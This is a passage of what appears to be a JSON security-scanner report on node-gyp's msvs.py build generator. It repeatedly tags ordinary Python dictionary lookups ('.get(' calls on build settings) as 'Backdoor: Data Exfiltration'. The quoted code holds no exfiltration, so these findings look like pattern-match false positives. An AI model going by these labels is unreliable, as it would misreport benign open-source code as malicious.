                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3662,
                  "startColumn": 41,
                  "endLine": 3662,
                  "endColumn": 46,
                  "snippet": {
                    "text": "                [\"Project\", guid],\n                [\"ReferenceOutputAssembly\", \"false\"],\n            ]\n            for config in dependency.spec.get(\"configurations\", {}).values():\n                if config.get(\"msvs_use_library_dependency_inputs\", 0):\n                    project_ref.append([\"UseLibraryDependencyInputs\", \"true\"])\n                    break\n",
                    "rendered": {
                      "text": "                [\"Project\", guid],\n                [\"ReferenceOutputAssembly\", \"false\"],\n            ]\n            for config in dependency.spec.get(\"configurations\", {}).values():\n                if config.get(\"msvs_use_library_dependency_inputs\", 0):\n                    project_ref.append([\"UseLibraryDependencyInputs\", \"true\"])\n                    break\n",
                      "markdown": "`                [\"Project\", guid],\n                [\"ReferenceOutputAssembly\", \"false\"],\n            ]\n            for config in dependency.spec.get(\"configurations\", {}).values():\n                if config.get(\"msvs_use_library_dependency_inputs\", 0):\n                    project_ref.append([\"UseLibraryDependencyInputs\", \"true\"])\n                    break\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3579,
                  "startColumn": 54,
                  "endLine": 3579,
                  "endColumn": 59,
                  "snippet": {
                    "text": "                        )\n                # Add precompile if needed\n                for config_name, configuration in spec[\"configurations\"].items():\n                    precompiled_source = configuration.get(\n                        \"msvs_precompiled_source\", \"\"\n                    )\n                    if precompiled_source != \"\":\n",
                    "rendered": {
                      "text": "                        )\n                # Add precompile if needed\n                for config_name, configuration in spec[\"configurations\"].items():\n                    precompiled_source = configuration.get(\n                        \"msvs_precompiled_source\", \"\"\n                    )\n                    if precompiled_source != \"\":\n",
                      "markdown": "`                        )\n                # Add precompile if needed\n                for config_name, configuration in spec[\"configurations\"].items():\n                    precompiled_source = configuration.get(\n                        \"msvs_precompiled_source\", \"\"\n                    )\n                    if precompiled_source != \"\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3566,
                  "startColumn": 52,
                  "endLine": 3566,
                  "endColumn": 57,
                  "snippet": {
                    "text": "        else:\n            if source not in sources_handled_by_action:\n                detail = []\n                excluded_configurations = exclusions.get(source, [])\n                if len(excluded_configurations) == len(spec[\"configurations\"]):\n                    detail.append([\"ExcludedFromBuild\", \"true\"])\n                else:\n",
                    "rendered": {
                      "text": "        else:\n            if source not in sources_handled_by_action:\n                detail = []\n                excluded_configurations = exclusions.get(source, [])\n                if len(excluded_configurations) == len(spec[\"configurations\"]):\n                    detail.append([\"ExcludedFromBuild\", \"true\"])\n                else:\n",
                      "markdown": "`        else:\n            if source not in sources_handled_by_action:\n                detail = []\n                excluded_configurations = exclusions.get(source, [])\n                if len(excluded_configurations) == len(spec[\"configurations\"]):\n                    detail.append([\"ExcludedFromBuild\", \"true\"])\n                else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3463,
                  "startColumn": 40,
                  "endLine": 3463,
                  "endColumn": 45,
                  "snippet": {
                    "text": "            \"Link\": [\"AdditionalOptions\"],\n            \"Lib\": [\"AdditionalOptions\"],\n        }\n        char = \" \" if name in exceptions.get(tool_name, []) else \";\"\n        formatted_value = char.join(\n            [MSVSSettings.ConvertVCMacrosToMSBuild(i) for i in value]\n        )\n",
                    "rendered": {
                      "text": "            \"Link\": [\"AdditionalOptions\"],\n            \"Lib\": [\"AdditionalOptions\"],\n        }\n        char = \" \" if name in exceptions.get(tool_name, []) else \";\"\n        formatted_value = char.join(\n            [MSVSSettings.ConvertVCMacrosToMSBuild(i) for i in value]\n        )\n",
                      "markdown": "`            \"Link\": [\"AdditionalOptions\"],\n            \"Lib\": [\"AdditionalOptions\"],\n        }\n        char = \" \" if name in exceptions.get(tool_name, []) else \";\"\n        formatted_value = char.join(\n            [MSVSSettings.ConvertVCMacrosToMSBuild(i) for i in value]\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3427,
                  "startColumn": 11,
                  "endLine": 3427,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    # Turn off WinRT compilation\n    _ToolAppend(msbuild_settings, \"ClCompile\", \"CompileAsWinRT\", \"false\")\n    # Turn on import libraries if appropriate\n    if spec.get(\"msvs_requires_importlibrary\"):\n        _ToolAppend(msbuild_settings, \"\", \"IgnoreImportLibrary\", \"false\")\n    # Loadable modules don't generate import libraries;\n    # tell dependent projects to not expect one.\n",
                    "rendered": {
                      "text": "    # Turn off WinRT compilation\n    _ToolAppend(msbuild_settings, \"ClCompile\", \"CompileAsWinRT\", \"false\")\n    # Turn on import libraries if appropriate\n    if spec.get(\"msvs_requires_importlibrary\"):\n        _ToolAppend(msbuild_settings, \"\", \"IgnoreImportLibrary\", \"false\")\n    # Loadable modules don't generate import libraries;\n    # tell dependent projects to not expect one.\n",
                      "markdown": "`    # Turn off WinRT compilation\n    _ToolAppend(msbuild_settings, \"ClCompile\", \"CompileAsWinRT\", \"false\")\n    # Turn on import libraries if appropriate\n    if spec.get(\"msvs_requires_importlibrary\"):\n        _ToolAppend(msbuild_settings, \"\", \"IgnoreImportLibrary\", \"false\")\n    # Loadable modules don't generate import libraries;\n    # tell dependent projects to not expect one.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3375,
                  "startColumn": 38,
                  "endLine": 3375,
                  "endColumn": 43,
                  "snippet": {
                    "text": "    prebuild = configuration.get(\"msvs_prebuild\")\n    postbuild = configuration.get(\"msvs_postbuild\")\n    def_file = _GetModuleDefinition(spec)\n    precompiled_header = configuration.get(\"msvs_precompiled_header\")\n\n    # Add the information to the appropriate tool\n    # TODO(jeanluc) We could optimize and generate these settings only if\n",
                    "rendered": {
                      "text": "    prebuild = configuration.get(\"msvs_prebuild\")\n    postbuild = configuration.get(\"msvs_postbuild\")\n    def_file = _GetModuleDefinition(spec)\n    precompiled_header = configuration.get(\"msvs_precompiled_header\")\n\n    # Add the information to the appropriate tool\n    # TODO(jeanluc) We could optimize and generate these settings only if\n",
                      "markdown": "`    prebuild = configuration.get(\"msvs_prebuild\")\n    postbuild = configuration.get(\"msvs_postbuild\")\n    def_file = _GetModuleDefinition(spec)\n    precompiled_header = configuration.get(\"msvs_precompiled_header\")\n\n    # Add the information to the appropriate tool\n    # TODO(jeanluc) We could optimize and generate these settings only if\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3373,
                  "startColumn": 29,
                  "endLine": 3373,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    defines = [_EscapeCppDefineForMSBuild(d) for d in defines]\n    disabled_warnings = _GetDisabledWarnings(configuration)\n    prebuild = configuration.get(\"msvs_prebuild\")\n    postbuild = configuration.get(\"msvs_postbuild\")\n    def_file = _GetModuleDefinition(spec)\n    precompiled_header = configuration.get(\"msvs_precompiled_header\")\n\n",
                    "rendered": {
                      "text": "    defines = [_EscapeCppDefineForMSBuild(d) for d in defines]\n    disabled_warnings = _GetDisabledWarnings(configuration)\n    prebuild = configuration.get(\"msvs_prebuild\")\n    postbuild = configuration.get(\"msvs_postbuild\")\n    def_file = _GetModuleDefinition(spec)\n    precompiled_header = configuration.get(\"msvs_precompiled_header\")\n\n",
                      "markdown": "`    defines = [_EscapeCppDefineForMSBuild(d) for d in defines]\n    disabled_warnings = _GetDisabledWarnings(configuration)\n    prebuild = configuration.get(\"msvs_prebuild\")\n    postbuild = configuration.get(\"msvs_postbuild\")\n    def_file = _GetModuleDefinition(spec)\n    precompiled_header = configuration.get(\"msvs_precompiled_header\")\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3372,
                  "startColumn": 28,
                  "endLine": 3372,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\n    defines = [_EscapeCppDefineForMSBuild(d) for d in defines]\n    disabled_warnings = _GetDisabledWarnings(configuration)\n    prebuild = configuration.get(\"msvs_prebuild\")\n    postbuild = configuration.get(\"msvs_postbuild\")\n    def_file = _GetModuleDefinition(spec)\n    precompiled_header = configuration.get(\"msvs_precompiled_header\")\n",
                    "rendered": {
                      "text": "\n    defines = [_EscapeCppDefineForMSBuild(d) for d in defines]\n    disabled_warnings = _GetDisabledWarnings(configuration)\n    prebuild = configuration.get(\"msvs_prebuild\")\n    postbuild = configuration.get(\"msvs_postbuild\")\n    def_file = _GetModuleDefinition(spec)\n    precompiled_header = configuration.get(\"msvs_precompiled_header\")\n",
                      "markdown": "`\n    defines = [_EscapeCppDefineForMSBuild(d) for d in defines]\n    disabled_warnings = _GetDisabledWarnings(configuration)\n    prebuild = configuration.get(\"msvs_prebuild\")\n    postbuild = configuration.get(\"msvs_postbuild\")\n    def_file = _GetModuleDefinition(spec)\n    precompiled_header = configuration.get(\"msvs_precompiled_header\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3363,
                  "startColumn": 33,
                  "endLine": 3363,
                  "endColumn": 38,
                  "snippet": {
                    "text": "        # Warn of ignored settings\n        ignored_settings = [\"msvs_tool_files\"]\n        for ignored_setting in ignored_settings:\n            value = configuration.get(ignored_setting)\n            if value:\n                print(\n                    \"Warning: The automatic conversion to MSBuild does not handle \"\n",
                    "rendered": {
                      "text": "        # Warn of ignored settings\n        ignored_settings = [\"msvs_tool_files\"]\n        for ignored_setting in ignored_settings:\n            value = configuration.get(ignored_setting)\n            if value:\n                print(\n                    \"Warning: The automatic conversion to MSBuild does not handle \"\n",
                      "markdown": "`        # Warn of ignored settings\n        ignored_settings = [\"msvs_tool_files\"]\n        for ignored_setting in ignored_settings:\n            value = configuration.get(ignored_setting)\n            if value:\n                print(\n                    \"Warning: The automatic conversion to MSBuild does not handle \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3347,
                  "startColumn": 37,
                  "endLine": 3347,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        MSVSSettings.ValidateMSBuildSettings(msbuild_settings)\n    else:\n        converted = True\n        msvs_settings = configuration.get(\"msvs_settings\", {})\n        msbuild_settings = MSVSSettings.ConvertToMSBuildSettings(msvs_settings)\n    include_dirs, midl_include_dirs, resource_include_dirs = _GetIncludeDirs(\n        configuration\n",
                    "rendered": {
                      "text": "        MSVSSettings.ValidateMSBuildSettings(msbuild_settings)\n    else:\n        converted = True\n        msvs_settings = configuration.get(\"msvs_settings\", {})\n        msbuild_settings = MSVSSettings.ConvertToMSBuildSettings(msvs_settings)\n    include_dirs, midl_include_dirs, resource_include_dirs = _GetIncludeDirs(\n        configuration\n",
                      "markdown": "`        MSVSSettings.ValidateMSBuildSettings(msbuild_settings)\n    else:\n        converted = True\n        msvs_settings = configuration.get(\"msvs_settings\", {})\n        msbuild_settings = MSVSSettings.ConvertToMSBuildSettings(msvs_settings)\n    include_dirs, midl_include_dirs, resource_include_dirs = _GetIncludeDirs(\n        configuration\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3230,
                  "startColumn": 40,
                  "endLine": 3230,
                  "endColumn": 45,
                  "snippet": {
                    "text": "\n        if new_paths:\n            _AddConditionalProperty(properties, condition, \"ExecutablePath\", new_paths)\n        tool_settings = msbuild_settings.get(\"\", {})\n        for name, value in sorted(tool_settings.items()):\n            formatted_value = _GetValueFormattedForMSBuild(\"\", name, value)\n            _AddConditionalProperty(properties, condition, name, formatted_value)\n",
                    "rendered": {
                      "text": "\n        if new_paths:\n            _AddConditionalProperty(properties, condition, \"ExecutablePath\", new_paths)\n        tool_settings = msbuild_settings.get(\"\", {})\n        for name, value in sorted(tool_settings.items()):\n            formatted_value = _GetValueFormattedForMSBuild(\"\", name, value)\n            _AddConditionalProperty(properties, condition, name, formatted_value)\n",
                      "markdown": "`\n        if new_paths:\n            _AddConditionalProperty(properties, condition, \"ExecutablePath\", new_paths)\n        tool_settings = msbuild_settings.get(\"\", {})\n        for name, value in sorted(tool_settings.items()):\n            formatted_value = _GetValueFormattedForMSBuild(\"\", name, value)\n            _AddConditionalProperty(properties, condition, name, formatted_value)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3223,
                  "startColumn": 21,
                  "endLine": 3223,
                  "endColumn": 26,
                  "snippet": {
                    "text": "            _AddConditionalProperty(\n                properties, condition, \"TargetPath\", attributes[\"TargetPath\"]\n            )\n        if attributes.get(\"TargetExt\"):\n            _AddConditionalProperty(\n                properties, condition, \"TargetExt\", attributes[\"TargetExt\"]\n            )\n",
                    "rendered": {
                      "text": "            _AddConditionalProperty(\n                properties, condition, \"TargetPath\", attributes[\"TargetPath\"]\n            )\n        if attributes.get(\"TargetExt\"):\n            _AddConditionalProperty(\n                properties, condition, \"TargetExt\", attributes[\"TargetExt\"]\n            )\n",
                      "markdown": "`            _AddConditionalProperty(\n                properties, condition, \"TargetPath\", attributes[\"TargetPath\"]\n            )\n        if attributes.get(\"TargetExt\"):\n            _AddConditionalProperty(\n                properties, condition, \"TargetExt\", attributes[\"TargetExt\"]\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3219,
                  "startColumn": 21,
                  "endLine": 3219,
                  "endColumn": 26,
                  "snippet": {
                    "text": "                properties, condition, \"TargetExt\", attributes[\"TargetExt\"]\n            )\n\n        if attributes.get(\"TargetPath\"):\n            _AddConditionalProperty(\n                properties, condition, \"TargetPath\", attributes[\"TargetPath\"]\n            )\n",
                    "rendered": {
                      "text": "                properties, condition, \"TargetExt\", attributes[\"TargetExt\"]\n            )\n\n        if attributes.get(\"TargetPath\"):\n            _AddConditionalProperty(\n                properties, condition, \"TargetPath\", attributes[\"TargetPath\"]\n            )\n",
                      "markdown": "`                properties, condition, \"TargetExt\", attributes[\"TargetExt\"]\n            )\n\n        if attributes.get(\"TargetPath\"):\n            _AddConditionalProperty(\n                properties, condition, \"TargetPath\", attributes[\"TargetPath\"]\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3189,
                  "startColumn": 22,
                  "endLine": 3189,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    # there are actions.\n    # TODO(jeanluc) Handle the equivalent of setting 'CYGWIN=nontsec'.\n    new_paths = []\n    cygwin_dirs = spec.get(\"msvs_cygwin_dirs\", [\".\"])[0]\n    if cygwin_dirs:\n        cyg_path = \"$(MSBuildProjectDirectory)\\\\%s\\\\bin\\\\\" % _FixPath(cygwin_dirs)\n        new_paths.append(cyg_path)\n",
                    "rendered": {
                      "text": "    # there are actions.\n    # TODO(jeanluc) Handle the equivalent of setting 'CYGWIN=nontsec'.\n    new_paths = []\n    cygwin_dirs = spec.get(\"msvs_cygwin_dirs\", [\".\"])[0]\n    if cygwin_dirs:\n        cyg_path = \"$(MSBuildProjectDirectory)\\\\%s\\\\bin\\\\\" % _FixPath(cygwin_dirs)\n        new_paths.append(cyg_path)\n",
                      "markdown": "`    # there are actions.\n    # TODO(jeanluc) Handle the equivalent of setting 'CYGWIN=nontsec'.\n    new_paths = []\n    cygwin_dirs = spec.get(\"msvs_cygwin_dirs\", [\".\"])[0]\n    if cygwin_dirs:\n        cyg_path = \"$(MSBuildProjectDirectory)\\\\%s\\\\bin\\\\\" % _FixPath(cygwin_dirs)\n        new_paths.append(cyg_path)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3177,
                  "startColumn": 51,
                  "endLine": 3177,
                  "endColumn": 56,
                  "snippet": {
                    "text": "        out_file = msbuild_settings[msbuild_tool].get(\"OutputFile\")\n        if out_file:\n            msbuild_attributes[\"TargetPath\"] = _FixPath(out_file)\n        target_ext = msbuild_settings[msbuild_tool].get(\"TargetExt\")\n        if target_ext:\n            msbuild_attributes[\"TargetExt\"] = target_ext\n\n",
                    "rendered": {
                      "text": "        out_file = msbuild_settings[msbuild_tool].get(\"OutputFile\")\n        if out_file:\n            msbuild_attributes[\"TargetPath\"] = _FixPath(out_file)\n        target_ext = msbuild_settings[msbuild_tool].get(\"TargetExt\")\n        if target_ext:\n            msbuild_attributes[\"TargetExt\"] = target_ext\n\n",
                      "markdown": "`        out_file = msbuild_settings[msbuild_tool].get(\"OutputFile\")\n        if out_file:\n            msbuild_attributes[\"TargetPath\"] = _FixPath(out_file)\n        target_ext = msbuild_settings[msbuild_tool].get(\"TargetExt\")\n        if target_ext:\n            msbuild_attributes[\"TargetExt\"] = target_ext\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3174,
                  "startColumn": 49,
                  "endLine": 3174,
                  "endColumn": 54,
                  "snippet": {
                    "text": "    msbuild_tool = msbuild_tool_map.get(spec[\"type\"])\n    if msbuild_tool:\n        msbuild_settings = config[\"finalized_msbuild_settings\"]\n        out_file = msbuild_settings[msbuild_tool].get(\"OutputFile\")\n        if out_file:\n            msbuild_attributes[\"TargetPath\"] = _FixPath(out_file)\n        target_ext = msbuild_settings[msbuild_tool].get(\"TargetExt\")\n",
                    "rendered": {
                      "text": "    msbuild_tool = msbuild_tool_map.get(spec[\"type\"])\n    if msbuild_tool:\n        msbuild_settings = config[\"finalized_msbuild_settings\"]\n        out_file = msbuild_settings[msbuild_tool].get(\"OutputFile\")\n        if out_file:\n            msbuild_attributes[\"TargetPath\"] = _FixPath(out_file)\n        target_ext = msbuild_settings[msbuild_tool].get(\"TargetExt\")\n",
                      "markdown": "`    msbuild_tool = msbuild_tool_map.get(spec[\"type\"])\n    if msbuild_tool:\n        msbuild_settings = config[\"finalized_msbuild_settings\"]\n        out_file = msbuild_settings[msbuild_tool].get(\"OutputFile\")\n        if out_file:\n            msbuild_attributes[\"TargetPath\"] = _FixPath(out_file)\n        target_ext = msbuild_settings[msbuild_tool].get(\"TargetExt\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3171,
                  "startColumn": 35,
                  "endLine": 3171,
                  "endColumn": 40,
                  "snippet": {
                    "text": "        \"windows_driver\": \"Link\",\n        \"static_library\": \"Lib\",\n    }\n    msbuild_tool = msbuild_tool_map.get(spec[\"type\"])\n    if msbuild_tool:\n        msbuild_settings = config[\"finalized_msbuild_settings\"]\n        out_file = msbuild_settings[msbuild_tool].get(\"OutputFile\")\n",
                    "rendered": {
                      "text": "        \"windows_driver\": \"Link\",\n        \"static_library\": \"Lib\",\n    }\n    msbuild_tool = msbuild_tool_map.get(spec[\"type\"])\n    if msbuild_tool:\n        msbuild_settings = config[\"finalized_msbuild_settings\"]\n        out_file = msbuild_settings[msbuild_tool].get(\"OutputFile\")\n",
                      "markdown": "`        \"windows_driver\": \"Link\",\n        \"static_library\": \"Lib\",\n    }\n    msbuild_tool = msbuild_tool_map.get(spec[\"type\"])\n    if msbuild_tool:\n        msbuild_settings = config[\"finalized_msbuild_settings\"]\n        out_file = msbuild_settings[msbuild_tool].get(\"OutputFile\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3159,
                  "startColumn": 31,
                  "endLine": 3159,
                  "endColumn": 36,
                  "snippet": {
                    "text": "        msbuild_attributes[\"TargetExt\"] = \".\" + ext\n\n    if spec.get(\"msvs_external_builder\"):\n        external_out_dir = spec.get(\"msvs_external_builder_out_dir\", \".\")\n        msbuild_attributes[\"OutputDirectory\"] = _FixPath(external_out_dir) + \"\\\\\"\n\n    # Make sure that 'TargetPath' matches 'Lib.OutputFile' or 'Link.OutputFile'\n",
                    "rendered": {
                      "text": "        msbuild_attributes[\"TargetExt\"] = \".\" + ext\n\n    if spec.get(\"msvs_external_builder\"):\n        external_out_dir = spec.get(\"msvs_external_builder_out_dir\", \".\")\n        msbuild_attributes[\"OutputDirectory\"] = _FixPath(external_out_dir) + \"\\\\\"\n\n    # Make sure that 'TargetPath' matches 'Lib.OutputFile' or 'Link.OutputFile'\n",
                      "markdown": "`        msbuild_attributes[\"TargetExt\"] = \".\" + ext\n\n    if spec.get(\"msvs_external_builder\"):\n        external_out_dir = spec.get(\"msvs_external_builder_out_dir\", \".\")\n        msbuild_attributes[\"OutputDirectory\"] = _FixPath(external_out_dir) + \"\\\\\"\n\n    # Make sure that 'TargetPath' matches 'Lib.OutputFile' or 'Link.OutputFile'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3158,
                  "startColumn": 11,
                  "endLine": 3158,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        ext = spec.get(\"product_extension\")\n        msbuild_attributes[\"TargetExt\"] = \".\" + ext\n\n    if spec.get(\"msvs_external_builder\"):\n        external_out_dir = spec.get(\"msvs_external_builder_out_dir\", \".\")\n        msbuild_attributes[\"OutputDirectory\"] = _FixPath(external_out_dir) + \"\\\\\"\n\n",
                    "rendered": {
                      "text": "        ext = spec.get(\"product_extension\")\n        msbuild_attributes[\"TargetExt\"] = \".\" + ext\n\n    if spec.get(\"msvs_external_builder\"):\n        external_out_dir = spec.get(\"msvs_external_builder_out_dir\", \".\")\n        msbuild_attributes[\"OutputDirectory\"] = _FixPath(external_out_dir) + \"\\\\\"\n\n",
                      "markdown": "`        ext = spec.get(\"product_extension\")\n        msbuild_attributes[\"TargetExt\"] = \".\" + ext\n\n    if spec.get(\"msvs_external_builder\"):\n        external_out_dir = spec.get(\"msvs_external_builder_out_dir\", \".\")\n        msbuild_attributes[\"OutputDirectory\"] = _FixPath(external_out_dir) + \"\\\\\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3155,
                  "startColumn": 18,
                  "endLine": 3155,
                  "endColumn": 23,
                  "snippet": {
